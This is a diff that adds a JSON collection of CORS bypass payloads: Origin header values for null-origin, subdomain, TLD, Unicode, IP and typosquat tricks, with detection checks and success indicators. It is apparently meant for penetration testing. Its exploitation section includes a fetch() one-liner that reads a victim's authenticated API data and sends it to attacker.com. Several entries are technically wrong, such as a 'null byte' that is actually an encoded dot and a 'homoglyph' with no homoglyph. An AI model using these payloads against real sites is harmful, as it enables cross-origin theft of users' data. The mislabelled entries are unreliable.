@@ -1,0 +1,369 @@
+{
+  "info": {
+    "name": "CORS Bypass Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "CORS misconfiguration exploitation payloads - origin bypass, null origin abuse, and subdomain tricks. 2026 Edition.",
+    "category": "Web Security",
+    "severity": "HIGH",
+    "owasp": "A01:2021 - Broken Access Control",
+    "references": ["CWE-942", "OWASP CORS Security Cheat Sheet"]
+  },
+  "philosophy": "CORS bypass is about understanding how origin validation works and finding edge cases. Each payload targets a specific bypass technique.",
+  "payloads": {
+    "null_origin_bypass": [
+      {
+        "payload": "null",
+        "header": "Origin",
+        "description": "Standard null origin - many apps accept this",
+        "context": "All requests",
+        "indicator": "Access-Control-Allow-Origin: null"
+      },
+      {
+        "payload": "Null",
+        "header": "Origin",
+        "description": "Capitalized Null",
+        "context": "Case-sensitive validation",
+        "indicator": "Access-Control-Allow-Origin: Null"
+      },
+      {
+        "payload": "NULL",
+        "header": "Origin",
+        "description": "All caps NULL",
+        "context": "Case-sensitive validation",
+        "indicator": "Access-Control-Allow-Origin: NULL"
+      },
+      {
+        "payload": "nul",
+        "header": "Origin",
+        "description": "Truncated null",
+        "context": "Prefix matching",
+        "indicator": "Potential bypass"
+      }
+    ],
+    "subdomain_bypass": [
+      {
+        "payload": "https://legit.example.com.attacker.com",
+        "header": "Origin",
+        "description": "Legit domain as subdomain of attacker",
+        "context": "Suffix/prefix validation",
+        "indicator": "Vary: Origin allows attacker subdomain"
+      },
+      {
+        "payload": "https://legit.example.com.attacker.evil.com",
+        "header": "Origin",
+        "description": "Legit domain as deep subdomain",
+        "context": "Deep suffix matching",
+        "indicator": "Bypass via deep subdomain"
+      },
+      {
+        "payload": "https://example.com.attacker.com",
+        "header": "Origin",
+        "description": "Target domain as subdomain of attacker",
+        "context": "If whitelist contains attacker.com",
+        "indicator": "Domain in whitelist"
+      },
+      {
+        "payload": "https://example-.com.attacker.com",
+        "header": "Origin",
+        "description": "Invalid char dash before TLD",
+        "context": "TLD validation bypass",
+        "indicator": "Dash prefix bypass"
+      },
+      {
+        "payload": "https://example-.com.attacker-evil.com",
+        "header": "Origin",
+        "description": "Hyphen confusion at boundary",
+        "context": "TLD boundary validation",
+        "indicator": "Boundary confusion"
+      },
+      {
+        "payload": "https://evilhacker.com",
+        "header": "Origin",
+        "description": "Attacker domain with similar string",
+        "context": "Substring matching only",
+        "indicator": "Substring contains bypass"
+      },
+      {
+        "payload": "https://hacker-website.com",
+        "header": "Origin",
+        "description": "Hacker with hyphens",
+        "context": "Whitelist contains 'hacker'",
+        "indicator": "Keyword bypass"
+      }
+    ],
+    "tld_confusion": [
+      {
+        "payload": "https://attacker.com.legitimate.com",
+        "header": "Origin",
+        "description": "Reverse domain as subdomain",
+        "context": "Suffix-based validation",
+        "indicator": "legitimate.com is suffix"
+      },
+      {
+        "payload": "https://legitimate-com.attacker.com",
+        "header": "Origin",
+        "description": "Target domain concatenated with hyphen",
+        "context": "Prefix matching",
+        "indicator": "legitimate-com prefix"
+      },
+      {
+        "payload": "https://legit1mate.com.attacker.com",
+        "header": "Origin",
+        "description": "Inserted digit to bypass exact match",
+        "context": "Exact match validation",
+        "indicator": "Number insertion bypass"
+      },
+      {
+        "payload": "https://legit2mate.com.attacker.com",
+        "header": "Origin",
+        "description": "Different digit insertion",
+        "context": "Numeric variations",
+        "indicator": "Digit variations"
+      }
+    ],
+    "special_characters_bypass": [
+      {
+        "payload": "https://legit%2ecom",
+        "header": "Origin",
+        "description": "URL-encoded dot",
+        "context": "If validation doesn't decode",
+        "indicator": "Encoded character bypass"
+      },
+      {
+        "payload": "https://legit\\.com.attacker.com",
+        "header": "Origin",
+        "description": "Backslash dot",
+        "context": "Windows-style separators",
+        "indicator": "Backslash bypass"
+      },
+      {
+        "payload": "https://legit\u3002com.attacker.com",
+        "header": "Origin",
+        "description": "Unicode fullwidth period (U+3002)",
+        "context": "If validation doesn't normalize Unicode",
+        "indicator": "Unicode normalization bypass"
+      },
+      {
+        "payload": "https://legit。com.attacker.com",
+        "header": "Origin",
+        "description": "Ideographic full stop (U+3002)",
+        "context": "Unicode IDN confusion",
+        "indicator": "IDN bypass"
+      },
+      {
+        "payload": "https://legit\u002eccom.attacker.com",
+        "header": "Origin",
+        "description": "Null byte in domain",
+        "context": "If validation truncates at null",
+        "indicator": "Null byte truncation"
+      },
+      {
+        "payload": "https://legit%00.com.attacker.com",
+        "header": "Origin",
+        "description": "URL-encoded null byte",
+        "context": "If validation doesn't sanitize",
+        "indicator": "URL null byte"
+      }
+    ],
+    "protocol_bypass": [
+      {
+        "payload": "http://legitimate.com",
+        "header": "Origin",
+        "description": "HTTP when target is HTTPS",
+        "context": "If validation only checks domain",
+        "indicator": "Protocol not validated"
+      },
+      {
+        "payload": "https://legitimate.com:80",
+        "header": "Origin",
+        "description": "HTTPS with HTTP port",
+        "context": "Port not validated",
+        "indicator": "Port bypass"
+      },
+      {
+        "payload": "https://legitimate.com/",
+        "header": "Origin",
+        "description": "Trailing slash difference",
+        "context": "Exact path matching",
+        "indicator": "Slash difference"
+      },
+      {
+        "payload": "https://legitimate.com#@attacker.com",
+        "header": "Origin",
+        "description": "Fragment with credentials",
+        "context": "Fragment not sent to server",
+        "indicator": "Fragment credential injection"
+      }
+    ],
+    "ip_address_bypass": [
+      {
+        "payload": "http://192.168.1.1",
+        "header": "Origin",
+        "description": "Private IP as origin",
+        "context": "If app expects domain but gets IP",
+        "indicator": "Private IP access"
+      },
+      {
+        "payload": "http://127.0.0.1",
+        "header": "Origin",
+        "description": "Localhost origin",
+        "context": "Local network testing",
+        "indicator": "Localhost bypass"
+      },
+      {
+        "payload": "https://2130706433",
+        "header": "Origin",
+        "description": "Decimal IP for localhost",
+        "context": "If validation doesn't convert",
+        "indicator": "Decimal IP"
+      },
+      {
+        "payload": "https://0x7f000001",
+        "header": "Origin",
+        "description": "Hexadecimal IP for localhost",
+        "context": "Hex notation bypass",
+        "indicator": "Hex IP"
+      }
+    ],
+    "whitelist_bypass_combinations": [
+      {
+        "payload": "https://subdomain.target.com",
+        "header": "Origin",
+        "description": "If whitelist allows target.com and subdomains",
+        "context": "Wildcard subdomain",
+        "indicator": "Any subdomain allowed"
+      },
+      {
+        "payload": "https://target.com.attacker.com",
+        "header": "Origin",
+        "description": "Target as subdomain of attacker",
+        "context": "If whitelist is *.attacker.com",
+        "indicator": "Attacker wildcard"
+      },
+      {
+        "payload": "https://target.com.mydomain.com",
+        "header": "Origin",
+        "description": "Target as subdomain of legitimate",
+        "context": "If whitelist contains mydomain.com",
+        "indicator": "Legitimate wildcard"
+      },
+      {
+        "payload": "https://target.com.evil.com",
+        "header": "Origin",
+        "description": "Target with attacker TLD",
+        "context": "Suffix validation on target.com",
+        "indicator": "Suffix confusion"
+      }
+    ],
+    "postmessage_bypass": [
+      {
+        "payload": "*",
+        "header": "Origin (postMessage)",
+        "description": "Wildcard in postMessage targetOrigin",
+        "context": "postMessage listener",
+        "indicator": "Any origin accepted"
+      },
+      {
+        "payload": "null",
+        "header": "Origin (postMessage)",
+        "description": "Null origin in postMessage",
+        "context": "Sandboxed iframe origin",
+        "indicator": "Sandbox bypass"
+      },
+      {
+        "payload": "https://attacker.com",
+        "header": "Origin (postMessage)",
+        "description": "Attacker domain for postMessage",
+        "context": "If origin check is weak",
+        "indicator": "Origin spoofing"
+      }
+    ],
+    "advanced_bypass": [
+      {
+        "payload": "https://target-corp.com",
+        "header": "Origin",
+        "description": "Typosquatting - missing letter",
+        "context": "If whitelist is typo'd",
+        "indicator": "Typosquat bypass"
+      },
+      {
+        "payload": "https://targetcorp.com",
+        "header": "Origin",
+        "description": "Homoglyph - similar looking chars",
+        "context": "If whitelist uses different charset",
+        "indicator": "Homoglyph bypass"
+      },
+      {
+        "payload": "https://taarget.com",
+        "header": "Origin",
+        "description": "Character swap",
+        "context": "Simple typos",
+        "indicator": "Character swap"
+      },
+      {
+        "payload": "https://traget.com",
+        "header": "Origin",
+        "description": "Missing character",
+        "context": "Typo variations",
+        "indicator": "Missing char"
+      },
+      {
+        "payload": "https://target.com\\@attacker.com",
+        "header": "Origin",
+        "description": "Basic auth with backslash",
+        "context": "Basic auth bypass",
+        "indicator": "Basic auth injection"
+      }
+    ]
+  },
+  "detection_checks": [
+    {
+      "test": "OPTIONS request with Origin header",
+      "expected": "Access-Control-Allow-Origin header in response"
+    },
+    {
+      "test": "Check if Origin validation is case-sensitive",
+      "method": "Send 'null' vs 'Null' vs 'NULL'"
+    },
+    {
+      "test": "Check if subdomain wildcard exists",
+      "method": "Test attacker subdomain"
+    },
+    {
+      "test": "Check if protocol is validated",
+      "method": "Send HTTP to HTTPS target"
+    },
+    {
+      "test": "Check if port is validated",
+      "method": "Add :8080 to origin"
+    },
+    {
+      "test": "Check credentials header support",
+      "expected": "Access-Control-Allow-Credentials: true with specific origin"
+    }
+  ],
+  "success_indicators": [
+    "Access-Control-Allow-Origin matches attacker origin",
+    "Access-Control-Allow-Credentials: true",
+    "Data returned in response",
+    "No CORS error in browser console"
+  ],
+  "exploitation_scenarios": [
+    {
+      "scenario": "Steal sensitive data",
+      "technique": "Fetch protected data and send to attacker server",
+      "example": "fetch('https://target.com/api/user').then(r=>r.json()).then(d=>fetch('https://attacker.com/log?d='+JSON.stringify(d)))"
+    },
+    {
+      "scenario": "Perform actions on behalf of user",
+      "technique": "Send authenticated requests via CORS",
+      "example": "fetch with credentials for CSRF-like attacks"
+    },
+    {
+      "scenario": "Bypass IP restriction",
+      "technique": "Use victim's browser as proxy",
+      "example": "Internal network scanning via victim's browser"
+    }
+  ]
+}
